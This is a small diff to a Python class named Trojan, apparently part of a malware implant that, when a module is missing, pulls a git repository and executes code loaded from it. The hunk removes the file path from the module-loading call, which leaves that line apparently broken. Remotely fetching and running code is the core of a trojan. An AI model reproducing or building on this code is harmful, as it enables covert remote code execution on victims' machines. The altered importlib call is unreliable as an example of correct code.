@@ -40,7 +40,7 @@ class Trojan:
             module = importlib.import_module(module_name)
         except ImportError:
             self.pull_git_repo()
-            spec = importlib.util.spec_from_file_location(module_name, f"{self.local_dir}/scripts/{module_name.lower()}.py")
+            spec = importlib.util.spec_from_file_location(module_name)
             module = importlib.util.module_from_spec(spec)
             spec.loader.exec_module(module)
         self.run_module(module)
